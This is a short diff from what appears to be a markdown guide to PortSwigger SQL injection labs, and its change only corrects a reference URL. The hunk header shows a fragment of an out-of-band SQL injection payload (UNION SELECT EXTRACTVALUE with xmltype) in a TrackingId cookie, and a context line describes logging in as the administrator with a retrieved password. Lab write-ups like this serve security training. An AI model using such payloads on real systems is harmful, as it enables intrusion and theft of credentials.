@@ -333,7 +333,7 @@ TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encodin
 7. In your browser, click "My account" to open the login page. Use the password to log in as the ``administrator`` user.
 
 ## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
-### Reference: [PortSwigger: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/in-band/lab-retrieve-hidden-data)
+### Reference: [PortSwigger: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
 
 <!-- omit in toc -->
 ### Quick Solution
